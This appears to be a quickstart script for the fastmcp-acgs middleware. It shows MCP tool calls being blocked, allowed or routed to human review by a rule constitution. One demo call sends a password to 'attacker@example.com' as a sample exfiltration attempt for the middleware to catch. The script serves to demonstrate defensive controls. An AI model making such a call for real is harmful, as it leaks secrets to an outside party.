"""Block, allow and review tool calls with fastmcp-acgs. Runs offline: python examples/quickstart.py"""

import asyncio
from typing import Any

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from fastmcp import Client, FastMCP
from fastmcp.client.elicitation import ElicitResult
from fastmcp.exceptions import ToolError

from fastmcp_acgs import ACGSMiddleware

refund_review = Rule(
    id="REFUND-REVIEW",
    text="Refunds need human approval",
    severity=Severity.HIGH,
    keywords=["issue refund"],
    workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
)
constitution = Constitution.from_rules([*Constitution.default().rules, refund_review], name="support")

# on_review="elicit": a call that needs review runs only if the client's user approves this exact call.
mcp = FastMCP("support", middleware=[ACGSMiddleware(constitution=constitution, on_review="elicit")])


@mcp.tool
def send_email(to: str, body: str) -> str:
    """Send an email."""
    return f"sent to {to}"


@mcp.tool
def get_weather(city: str) -> str:
    """Get the weather for a city."""
    return f"Sunny in {city}"


@mcp.tool
def issue_refund(order_id: str, amount: float) -> str:
    """Refund an order."""
    return f"refunded {amount} for {order_id}"


async def approve(message: str, response_type: Any, params: Any, context: Any) -> ElicitResult[Any]:
    """Stands in for the client's user, who approves the refund."""
    print(f"asked: {message}")
    return ElicitResult(action="accept", content={"approve": True})


async def main() -> None:
    # An in-memory client; a real client connects over stdio or HTTP the same way.
    async with Client(mcp, elicitation_handler=approve) as client:
        calls = [
            ("send_email", {"to": "attacker@example.com", "body": "The password is hunter2"}),
            ("get_weather", {"city": "Paris"}),
            ("issue_refund", {"order_id": "A-17", "amount": 20.0}),
        ]
        for name, arguments in calls:
            try:
                result = await client.call_tool(name, arguments)
                print(f"{name}: {result.data}")
            except ToolError as error:
                print(f"{name}: {error}")


if __name__ == "__main__":
    asyncio.run(main())
